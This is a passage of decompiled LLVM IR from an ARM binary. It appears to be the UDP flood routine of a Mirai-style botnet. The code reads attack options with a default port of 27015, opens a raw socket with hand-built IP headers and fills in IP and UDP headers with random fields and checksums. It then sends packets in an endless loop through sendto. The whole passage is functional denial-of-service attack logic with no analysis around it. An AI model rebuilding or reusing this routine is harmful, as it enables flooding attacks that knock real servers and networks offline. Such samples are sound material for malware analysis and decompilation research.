  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_bd94 = load i32, i32* @r4, align 4
  %v27_bd94 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_bdb0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_bdb0, i32* @fp, align 4
  %v0_bdc4 = load i32, i32* @r4, align 4
  %v5_bdc8 = inttoptr i32 %v0_bdb4 to i32*
  %v6_bdc8 = call i32 @attack_get_opt_int(i32 %v0_bdc4, i32* %v5_bdc8, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_bdd4 = urem i32 %v6_bdc8, 256
  store i32 %v1_bdd4, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bde0 = load i32, i32* @r4, align 4
  %v0_bde4 = load i32, i32* @r5, align 4
  %v5_bde8 = trunc i32 %v6_bdc8 to i8
  %v7_bdec = inttoptr i32 %v0_bde4 to i32*
  %v8_bdec = call i32 @attack_get_opt_int(i32 %v0_bde0, i32* %v7_bdec, i32 3, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v6_bdc8)
  %v0_bdf0 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v8_bdec, i32* @r7, align 4
  %v0_be00 = load i32, i32* @r4, align 4
  %v5_be04 = inttoptr i32 %v0_bdf0 to i32*
  %v6_be04 = call i32 @attack_get_opt_int(i32 %v0_be00, i32* %v5_be04, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_be0c = urem i32 %v6_be04, 256
  store i32 %v1_be0c, i32* %ip.global-to-local, align 4
  %v0_be10 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be1c = load i32, i32* @r4, align 4
  %sext = mul i32 %v6_be04, 16777216
  %v5_be24 = sdiv i32 %sext, 16777216
  %v6_be24 = inttoptr i32 %v0_be10 to i32*
  %v7_be24 = call i32 @attack_get_opt_int(i32 %v0_be1c, i32* %v6_be24, i32 5, i32 0, i32 %v5_be24)
  %v1_be30 = urem i32 %v7_be24, 256
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_be3c = load i32, i32* @r4, align 4
  %v0_be40 = load i32, i32* @r5, align 4
  %v6_be48 = inttoptr i32 %v0_be40 to i32*
  %v7_be48 = call i32 @attack_get_opt_int(i32 %v0_be3c, i32* %v6_be48, i32 6, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v1_be30)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_be58 = load i32, i32* @r5, align 4
  store i32 %v7_be48, i32* @r6, align 4
  %v0_be60 = load i32, i32* @r4, align 4
  %v5_be64 = inttoptr i32 %v0_be58 to i32*
  %v6_be64 = call i32 @attack_get_opt_int(i32 %v0_be60, i32* %v5_be64, i32 7, i32 27015, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_be64, i32* @r4, align 4
  %v1_be70 = call i32 @table_unlock_val(i32 25)
  %v3_be7c = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_be90 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_be94 = icmp eq i32 %v3_be90, -1
  store i1 %v7_be94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_be90, i32* @sb, align 4
  br i1 %v7_be94, label %dec_label_pc_c1bc, label %dec_label_pc_bea0

dec_label_pc_bea0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bea8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bea8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bebc = call i32 @__GI_setsockopt(i32 %v3_be90, i32 0, i32 3, i32 %v6_bea8, i32 ptrtoint (i32* @0 to i32))
  %v7_bec0 = icmp eq i32 %v5_bebc, -1
  store i1 %v7_bec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bec0, label %dec_label_pc_c1b4, label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bea0
  %v0_bec8 = load i32, i32* @r4, align 4
  %v3_bec8 = mul i32 %v0_bec8, 65536
  store i32 %v3_bec8, i32* @lr, align 4
  %v0_becc = load i32, i32* @r7, align 4
  %v0_bed0 = load i32, i32* @r6, align 4
  %v3_bed0 = mul i32 %v0_bed0, 65536
  store i32 %v3_bed0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_bed8 = urem i32 %v0_becc, 65536
  %v3_bedc = urem i32 %v0_bed0, 65536
  store i32 %v3_bedc, i32* %r2.global-to-local, align 4
  %v3_bee0 = urem i32 %v0_bec8, 65536
  store i32 %v3_bee0, i32* %r3.global-to-local, align 4
  %v0_bee4 = load i32, i32* @r8, align 4
  %v2_bee4 = icmp eq i32 %v0_bee4, 0
  store i1 %v2_bee4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bee4, label %dec_label_pc_c020.preheader, label %dec_label_pc_befc

dec_label_pc_befc:                                ; preds = %dec_label_pc_bec8
  %tmp33 = mul i32 %v0_becc, 256
  %v3_bf0c = and i32 %tmp33, 65280
  store i32 %v3_bf0c, i32* %r3.global-to-local, align 4
  %tmp34 = mul i32 %v0_bed0, 256
  %v3_bf10 = and i32 %tmp34, 65280
  store i32 %v3_bf10, i32* %r2.global-to-local, align 4
  %tmp35 = mul i32 %v0_bec8, 256
  %v3_bf14 = and i32 %tmp35, 65280
  %tmp36 = udiv i32 %v0_becc, 256
  %v4_bf18 = urem i32 %tmp36, 256
  %v5_bf18 = or i32 %v4_bf18, %v3_bf0c
  store i32 %v5_bf18, i32* @r5, align 4
  %tmp37 = udiv i32 %v0_bed0, 256
  %v4_bf1c = urem i32 %tmp37, 256
  %v5_bf1c = or i32 %v4_bf1c, %v3_bf10
  store i32 %v5_bf1c, i32* @r6, align 4
  %tmp38 = udiv i32 %v0_bec8, 256
  %v4_bf20 = urem i32 %tmp38, 256
  %v5_bf20 = or i32 %v4_bf20, %v3_bf14
  store i32 %v5_bf20, i32* @r7, align 4
  %v1_bfa8 = trunc i32 %v5_be24 to i8
  br label %dec_label_pc_bf24

dec_label_pc_bf24:                                ; preds = %.thread, %dec_label_pc_befc
  %v2_bf2c = call i32 @calloc(i32 128, i32 1)
  %v3_bf30 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf30, i32* %r2.global-to-local, align 4
  %v5_bf38 = mul i32 %v3_bf30, 24
  store i32 %v5_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = load i32, i32* @fp, align 4
  %v2_bf3c = load i32, i32* @r4, align 4
  %v5_bf3c = mul i32 %v2_bf3c, 4
  %v6_bf3c = add i32 %v5_bf3c, %v1_bf3c
  %v7_bf3c = inttoptr i32 %v6_bf3c to i32*
  store i32 %v2_bf2c, i32* %v7_bf3c, align 4
  %v0_bf40 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf40 = load i32, i32* @sl, align 4
  %v2_bf40 = add i32 %v1_bf40, %v0_bf40
  store i32 %v2_bf40, i32* %r3.global-to-local, align 4
  %v0_bf44 = load i32, i32* @fp, align 4
  %v1_bf44 = load i32, i32* %r2.global-to-local, align 4
  %v4_bf44 = mul i32 %v1_bf44, 4
  %v5_bf44 = add i32 %v4_bf44, %v0_bf44
  %v6_bf44 = inttoptr i32 %v5_bf44 to i32*
  %v7_bf44 = load i32, i32* %v6_bf44, align 4
  store i32 %v7_bf44, i32* @lr, align 4
  %v1_bf4c = inttoptr i32 %v7_bf44 to i8*
  %v2_bf4c = load i8, i8* %v1_bf4c, align 1
  %tmp = urem i8 %v2_bf4c, 16
  %v1_bf50 = zext i8 %tmp to i32
  %v1_bf54 = or i32 %v1_bf50, 64
  store i32 %v1_bf54, i32* %r3.global-to-local, align 4
  %v1_bf5c = trunc i32 %v1_bf54 to i8
  store i8 %v1_bf5c, i8* %v1_bf4c, align 1
  %v0_bf60 = load i32, i32* @lr, align 4
  %v1_bf60 = inttoptr i32 %v0_bf60 to i8*
  %v2_bf60 = load i8, i8* %v1_bf60, align 1
  %v1_bf64 = and i8 %v2_bf60, -16
  %v1_bf68 = or i8 %v1_bf64, 5
  store i8 %v1_bf68, i8* %v1_bf60, align 1
  %v2_bf74 = load i32, i32* @lr, align 4
  %v3_bf74 = add i32 %v2_bf74, 1
  %v4_bf74 = inttoptr i32 %v3_bf74 to i8*
  store i8 %v5_bde8, i8* %v4_bf74, align 1
  %v3_bf78 = load i32, i32* %stack_var_-48, align 4
  %v3_bf7c = mul i32 %v3_bf78, 65536
  %v1_bf80 = add i32 %v3_bf7c, 2097152
  %v3_bf84 = udiv i32 %v1_bf80, 256
  %v4_bf8c = udiv i32 %v1_bf80, 16777216
  %v5_bf8c = or i32 %v3_bf84, %v4_bf8c
  %v3_bf90 = urem i32 %v3_bf78, 65536
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  %v1_bf94 = trunc i32 %v5_bf8c to i16
  %v2_bf94 = load i32, i32* @lr, align 4
  %v3_bf94 = add i32 %v2_bf94, 2
  %v4_bf94 = inttoptr i32 %v3_bf94 to i16*
  store i16 %v1_bf94, i16* %v4_bf94, align 2
  %v0_bf98 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf98 = mul i32 %v0_bf98, 65536
  %v3_bfa0 = add i32 %v1_bf98, 786432
  store i32 %v3_bfa0, i32* %r2.global-to-local, align 4
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  %v2_bfa8 = load i32, i32* @lr, align 4
  %v3_bfa8 = add i32 %v2_bfa8, 8
  %v4_bfa8 = inttoptr i32 %v3_bfa8 to i8*
  store i8 %v1_bfa8, i8* %v4_bfa8, align 1
  %v0_bfac = load i32, i32* %r2.global-to-local, align 4
  %v3_bfac = udiv i32 %v0_bfac, 256
  %v1_bfb0 = and i32 %v3_bfac, ptrtoint (i32* @global_var_ff00.34 to i32)
  %v0_bfb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bfb4 = icmp eq i32 %v0_bfb4, 0
  store i1 %v2_bfb4, i1* %cpsr_z.global-to-local, align 1
  %v4_bfb8 = udiv i32 %v0_bfac, 16777216
  %v5_bfb8 = or i32 %v1_bfb0, %v4_bfb8
  store i32 %v5_bfb8, i32* %ip.global-to-local, align 4
  %v2_bfc0 = load i32, i32* @lr, align 4
  %v3_bfc0 = add i32 %v2_bfc0, 9
  %v4_bfc0 = inttoptr i32 %v3_bfc0 to i8*
  store i8 17, i8* %v4_bfc0, align 1
  store i32 ptrtoint (i32* @global_var_24f10.62 to i32), i32* %r3.global-to-local, align 4
  %v0_bfc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bfc8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf24
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_bfcc = load i32, i32* @lr, align 4
  %v4_bfcc = add i32 %v3_bfcc, 6
  %v5_bfcc = inttoptr i32 %v4_bfcc to i16*
  store i16 64, i16* %v5_bfcc, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf24, %bb
  %v2_bfd0 = load i32, i32* @global_var_24f10.62, align 4
  %v1_bfd4 = load i32, i32* @lr, align 4
  %v2_bfd4 = add i32 %v1_bfd4, 12
  %v3_bfd4 = inttoptr i32 %v2_bfd4 to i32*
  store i32 %v2_bfd0, i32* %v3_bfd4, align 4
  store i32 %v2_bf40, i32* %r2.global-to-local, align 4
  %v1_bfdc = add i32 %v2_bf40, 16
  %v2_bfdc = inttoptr i32 %v1_bfdc to i32*
  %v3_bfdc = load i32, i32* %v2_bfdc, align 4
  %v1_bfe0 = load i32, i32* @lr, align 4
  %v2_bfe0 = add i32 %v1_bfe0, 16
  %v3_bfe0 = inttoptr i32 %v2_bfe0 to i32*
  store i32 %v3_bfdc, i32* %v3_bfe0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_bfe8 = load i32, i32* @lr, align 4
  %v1_bfe8 = add i32 %v0_bfe8, 20
  store i32 %v1_bfe8, i32* %r4.global-to-local, align 4
  %v2_bfec = add i32 %v0_bfe8, 28
  %v3_bfec = inttoptr i32 %v2_bfec to i32*
  store i32 -1, i32* %v3_bfec, align 4
  %v0_bff0 = load i32, i32* @r5, align 4
  %v1_bff0 = trunc i32 %v0_bff0 to i16
  %v2_bff0 = load i32, i32* @lr, align 4
  %v3_bff0 = add i32 %v2_bff0, 4
  %v4_bff0 = inttoptr i32 %v3_bff0 to i16*
  store i16 %v1_bff0, i16* %v4_bff0, align 2
  %v0_bff4 = load i32, i32* @lr, align 4
  %v1_bff4 = add i32 %v0_bff4, 32
  %v0_bff8 = load i32, i32* %ip.global-to-local, align 4
  %v1_bff8 = trunc i32 %v0_bff8 to i16
  %v2_bff8 = load i32, i32* %r4.global-to-local, align 4
  %v3_bff8 = add i32 %v2_bff8, 4
  %v4_bff8 = inttoptr i32 %v3_bff8 to i16*
  store i16 %v1_bff8, i16* %v4_bff8, align 2
  %v0_bffc = load i32, i32* @r7, align 4
  %v1_bffc = trunc i32 %v0_bffc to i16
  %v2_bffc = load i32, i32* %r4.global-to-local, align 4
  %v3_bffc = add i32 %v2_bffc, 2
  %v4_bffc = inttoptr i32 %v3_bffc to i16*
  store i16 %v1_bffc, i16* %v4_bffc, align 2
  %v0_c000 = load i32, i32* @r6, align 4
  %v1_c000 = trunc i32 %v0_c000 to i16
  %v2_c000 = load i32, i32* @lr, align 4
  %v3_c000 = add i32 %v2_c000, 20
  %v4_c000 = inttoptr i32 %v3_c000 to i16*
  store i16 %v1_c000, i16* %v4_c000, align 2
  %v3_c004 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c004, i32* %r2.global-to-local, align 4
  %v3_c008 = call i32 @util_memcpy(i32 %v1_bff4, i32 %v3_be7c, i32 %v3_c004)
  %v3_c00c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = add i32 %v3_c00c, 1
  store i32 %v1_c010, i32* @r4, align 4
  %v1_c014 = load i32, i32* @r8, align 4
  %v9_c014 = icmp eq i32 %v1_c010, %v1_c014
  store i1 %v9_c014, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c010, i32* %stack_var_-44, align 4
  %v5_c01c = icmp slt i32 %v1_c010, %v1_c014
  br i1 %v5_c01c, label %dec_label_pc_bf24, label %dec_label_pc_c020.preheader

dec_label_pc_c020.preheader:                      ; preds = %.thread, %dec_label_pc_bec8
  %v0_c024.ph = phi i32 [ 0, %dec_label_pc_bec8 ], [ %v1_c014, %.thread ]
  %v9_c060 = icmp eq i32 %v3_bed8, ptrtoint (i16* @global_var_ffff.60 to i32)
  br label %dec_label_pc_c020

dec_label_pc_c020:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c, %dec_label_pc_c020.preheader
  %v0_c024 = phi i32 [ %v0_c024.ph, %dec_label_pc_c020.preheader ], [ 0, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c020 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c024 = icmp eq i32 %v0_c024, 0
  store i1 %v2_c024, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c024, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c
  br label %dec_label_pc_c034

dec_label_pc_c034:                                ; preds = %dec_label_pc_c080, %dec_label_pc_c030
  %v1_c044 = phi i32 [ %v1_c0fc, %dec_label_pc_c080 ], [ 0, %dec_label_pc_c030 ]
  %v5_c038 = mul i32 %v1_c044, 24
  %v1_c03c = load i32, i32* @sl, align 4
  %v2_c03c = add i32 %v1_c03c, %v5_c038
  store i32 %v2_c03c, i32* %r3.global-to-local, align 4
  %v1_c040 = add i32 %v2_c03c, 20
  %v2_c040 = inttoptr i32 %v1_c040 to i8*
  %v3_c040 = load i8, i8* %v2_c040, align 1
  %v4_c040 = zext i8 %v3_c040 to i32
  store i32 %v4_c040, i32* %r2.global-to-local, align 4
  %v0_c044 = load i32, i32* @fp, align 4
  %v4_c044 = mul i32 %v1_c044, 4
  %v5_c044 = add i32 %v0_c044, %v4_c044
  %v6_c044 = inttoptr i32 %v5_c044 to i32*
  %v7_c044 = load i32, i32* %v6_c044, align 4
  store i32 %v7_c044, i32* @r5, align 4
  %v7_c04c = icmp eq i8 %v3_c040, 31
  store i1 %v7_c04c, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r7, align 4
  %v1_c054 = add i32 %v7_c044, 20
  store i32 %v1_c054, i32* @r6, align 4
  %tmp39 = icmp ult i8 %v3_c040, 32
  br i1 %tmp39, label %dec_label_pc_c120, label %dec_label_pc_c05c

dec_label_pc_c05c:                                ; preds = %dec_label_pc_c034
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  store i1 %v9_c060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c060, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c068:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v1_c06c = phi i32 [ %v1_c178, %dec_label_pc_c120 ], [ ptrtoint (i16* @global_var_ffff.60 to i32), %dec_label_pc_c05c ]
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v3_bedc, %v1_c06c
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c06c, label %dec_label_pc_c194, label %dec_label_pc_c074

dec_label_pc_c074:                                ; preds = %dec_label_pc_c180.dec_label_pc_c074_crit_edge, %dec_label_pc_c068
  %v1_c078 = phi i32 [ %v1_c078.pre, %dec_label_pc_c180.dec_label_pc_c074_crit_edge ], [ %v1_c06c, %dec_label_pc_c068 ]
  %v9_c078 = icmp eq i32 %v3_bee0, %v1_c078
  store i1 %v9_c078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c078, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c080:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074, %dec_label_pc_c1a8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c084 = load i32, i32* @r5, align 4
  %v3_c084 = add i32 %v2_c084, 10
  %v4_c084 = inttoptr i32 %v3_c084 to i16*
  store i16 0, i16* %v4_c084, align 2
  %v0_c08c = load i32, i32* @r5, align 4
  store i32 %v0_c08c, i32* @r0, align 4
  %v2_c090 = call i32 @checksum_generic(i32 %v0_c08c, i32 20)
  %v3_c090 = trunc i32 %v2_c090 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c098 = load i32, i32* @r5, align 4
  %v4_c098 = add i32 %v3_c098, 10
  %v5_c098 = inttoptr i32 %v4_c098 to i16*
  store i16 %v3_c090, i16* %v5_c098, align 2
  %v0_c09c = load i32, i32* %r3.global-to-local, align 4
  %v1_c09c = trunc i32 %v0_c09c to i16
  %v2_c09c = load i32, i32* @r6, align 4
  %v3_c09c = add i32 %v2_c09c, 6
  %v4_c09c = inttoptr i32 %v3_c09c to i16*
  store i16 %v1_c09c, i16* %v4_c09c, align 2
  %v3_c0a0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0a0, i32* %r3.global-to-local, align 4
  %v0_c0a4 = load i32, i32* @r6, align 4
  store i32 %v0_c0a4, i32* @r1, align 4
  %v1_c0a8 = add i32 %v0_c0a4, 4
  %v2_c0a8 = inttoptr i32 %v1_c0a8 to i16*
  %v3_c0a8 = load i16, i16* %v2_c0a8, align 2
  %v4_c0a8 = zext i16 %v3_c0a8 to i32
  store i32 %v4_c0a8, i32* %r2.global-to-local, align 4
  %v1_c0ac = add i32 %v3_c0a0, 12
  store i32 %v1_c0ac, i32* %r3.global-to-local, align 4
  %v0_c0b0 = load i32, i32* @r5, align 4
  %v4_c0b4 = call i32 @checksum_tcpudp(i32 %v0_c0b0, i32 %v0_c0a4, i32 %v4_c0a8, i32 %v1_c0ac)
  %v5_c0b4 = trunc i32 %v4_c0b4 to i16
  %v3_c0b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0b8, i32* %r3.global-to-local, align 4
  %v3_c0bc = mul i32 %v3_c0b8, 32
  store i32 %v3_c0bc, i32* %lr.global-to-local, align 4
  %v3_c0c0 = load i32, i32* @r6, align 4
  %v4_c0c0 = add i32 %v3_c0c0, 6
  %v5_c0c0 = inttoptr i32 %v4_c0c0 to i16*
  store i16 %v5_c0b4, i16* %v5_c0c0, align 2
  %v0_c0c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v1_c0c4, -8
  %v5_c0c4 = add i32 %v0_c0c4, %tmp40
  store i32 %v5_c0c4, i32* %lr.global-to-local, align 4
  %v0_c0c8 = load i32, i32* @r6, align 4
  %v1_c0c8 = add i32 %v0_c0c8, 2
  %v2_c0c8 = inttoptr i32 %v1_c0c8 to i16*
  %v3_c0c8 = load i16, i16* %v2_c0c8, align 2
  %v4_c0c8 = zext i16 %v3_c0c8 to i32
  store i32 %v4_c0c8, i32* @r6, align 4
  %v3_c0cc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0cc, i32* %r2.global-to-local, align 4
  %v1_c0d0 = load i32, i32* @sl, align 4
  %v2_c0d0 = add i32 %v1_c0d0, %v5_c0c4
  store i32 %v2_c0d0, i32* @lr, align 4
  %v3_c0d4 = add i32 %v2_c0d0, 2
  %v4_c0d4 = inttoptr i32 %v3_c0d4 to i16*
  store i16 %v3_c0c8, i16* %v4_c0d4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c0e0 = load i32, i32* @r5, align 4
  %v0_c0e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0e4 = add i32 %v0_c0e4, 32
  store i32 %v1_c0e4, i32* %r2.global-to-local, align 4
  %v0_c0e8 = load i32, i32* @sb, align 4
  %v0_c0ec = load i32, i32* @lr, align 4
  %v6_c0f4 = call i32 @__libc_sendto(i32 %v0_c0e8, i32 %v0_c0e0, i32 %v1_c0e4, i32 16384, i32 %v0_c0ec, i32 16)
  %v3_c0f8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0f8, i32* %r3.global-to-local, align 4
  %v1_c0fc = add i32 %v3_c0f8, 1
  %v1_c100 = load i32, i32* @r8, align 4
  %v9_c100 = icmp eq i32 %v1_c0fc, %v1_c100
  store i1 %v9_c100, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0fc, i32* %stack_var_-44, align 4
  %v5_c108 = icmp slt i32 %v1_c0fc, %v1_c100
  br i1 %v5_c108, label %dec_label_pc_c034, label %dec_label_pc_c10c

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c080
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c110 = icmp eq i32 %v1_c100, 0
  store i1 %v2_c110, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c110, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c120:                                ; preds = %dec_label_pc_c034
  %v1_c120 = add i32 %v2_c03c, 16
  %v2_c120 = inttoptr i32 %v1_c120 to i32*
  %v3_c120 = load i32, i32* %v2_c120, align 4
  store i32 %v3_c120, i32* @r4, align 4
  %v0_c124 = call i32 @rand_next()
  %v3_c128 = load i32, i32* %stack_var_-44, align 4
  %v5_c130 = mul i32 %v3_c128, 24
  %v0_c134 = load i32, i32* @r4, align 4
  %v1_c134 = and i32 %v0_c134, 16711680
  store i32 %v1_c134, i32* %ip.global-to-local, align 4
  %v3_c138 = udiv i32 %v0_c134, 16777216
  %v4_c13c = udiv i32 %v1_c134, 256
  %v5_c13c = or i32 %v4_c13c, %v3_c138
  store i32 %v5_c13c, i32* %r2.global-to-local, align 4
  %v1_c140 = load i32, i32* @sl, align 4
  %v2_c140 = add i32 %v1_c140, %v5_c130
  %v1_c144 = and i32 %v0_c134, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_c144, i32* %r3.global-to-local, align 4
  %v1_c148 = add i32 %v2_c140, 20
  %v2_c148 = inttoptr i32 %v1_c148 to i8*
  %v3_c148 = load i8, i8* %v2_c148, align 1
  %v4_c148 = zext i8 %v3_c148 to i32
  store i32 %v4_c148, i32* %ip.global-to-local, align 4
  %v4_c14c = mul i32 %v1_c144, 256
  %v4_c150 = mul i32 %v0_c134, 16777216
  %v5_c14c = or i32 %v4_c14c, %v4_c150
  %v5_c150 = or i32 %v5_c14c, %v5_c13c
  %v7_c154 = lshr i32 %v0_c124, %v4_c148
  %v8_c154 = add i32 %v7_c154, %v5_c150
  store i32 %v8_c154, i32* %r2.global-to-local, align 4
  %v5_c16c = call i32 @llvm.bswap.i32(i32 %v8_c154)
  %v1_c170 = load i32, i32* @r5, align 4
  %v2_c170 = add i32 %v1_c170, 16
  %v3_c170 = inttoptr i32 %v2_c170 to i32*
  store i32 %v5_c16c, i32* %v3_c170, align 4
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  %v1_c178 = load i32, i32* @r7, align 4
  %v9_c178 = icmp eq i32 %v3_bed8, %v1_c178
  store i1 %v9_c178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c178, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c180:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v0_c180 = call i32 @rand_next()
  %v1_c180 = trunc i32 %v0_c180 to i16
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v1_c188 = load i32, i32* @r7, align 4
  %v9_c188 = icmp eq i32 %v3_bedc, %v1_c188
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  %v3_c18c = load i32, i32* @r5, align 4
  %v4_c18c = add i32 %v3_c18c, 4
  %v5_c18c = inttoptr i32 %v4_c18c to i16*
  store i16 %v1_c180, i16* %v5_c18c, align 2
  br i1 %v9_c188, label %dec_label_pc_c194, label %dec_label_pc_c180.dec_label_pc_c074_crit_edge

dec_label_pc_c180.dec_label_pc_c074_crit_edge:    ; preds = %dec_label_pc_c180
  %v1_c078.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c074

dec_label_pc_c194:                                ; preds = %dec_label_pc_c180, %dec_label_pc_c068
  %v0_c194 = call i32 @rand_next()
  %v1_c194 = trunc i32 %v0_c194 to i16
  %v1_c19c = load i32, i32* @r7, align 4
  %v9_c19c = icmp eq i32 %v3_bee0, %v1_c19c
  store i1 %v9_c19c, i1* %cpsr_z.global-to-local, align 1
  %v3_c1a0 = load i32, i32* @r5, align 4
  %v4_c1a0 = add i32 %v3_c1a0, 20
  %v5_c1a0 = inttoptr i32 %v4_c1a0 to i16*
  store i16 %v1_c194, i16* %v5_c1a0, align 2
  br i1 %v9_c19c, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074
  %v0_c1a8 = call i32 @rand_next()
  %v1_c1a8 = trunc i32 %v0_c1a8 to i16
  %v3_c1ac = load i32, i32* @r6, align 4
  %v4_c1ac = add i32 %v3_c1ac, 2
  %v5_c1ac = inttoptr i32 %v4_c1ac to i16*
  store i16 %v1_c1a8, i16* %v5_c1ac, align 2
  br label %dec_label_pc_c080

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_bea0
  %v0_c1b4 = load i32, i32* @sb, align 4
  %v1_c1b8 = call i32 @__GI___libc_close(i32 %v0_c1b4)
  br label %dec_label_pc_c1bc

dec_label_pc_c1bc:                                ; preds = %entry, %dec_label_pc_c1b4
  %v1_c1c4 = phi i32 [ %v3_be90, %entry ], [ %v1_c1b8, %dec_label_pc_c1b4 ]
  store i32 %v3_bd94, i32* %r4.global-to-local, align 4
  store i32 %v27_bd94, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1c4

; uselistorder directives
  uselistorder i32 %v1_c178, { 1, 0 }
  uselistorder i32 %v0_c134, { 0, 2, 1, 3 }
  uselistorder i32 %v1_c0fc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c0c4, { 1, 0 }
  uselistorder i32 %v1_c010, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf78, { 1, 0 }
  uselistorder i32 %v3_bf10, { 1, 0 }
  uselistorder i32 %v3_bf0c, { 1, 0 }
  uselistorder i32 %v3_bed8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bed0, { 1, 0, 3, 2 }
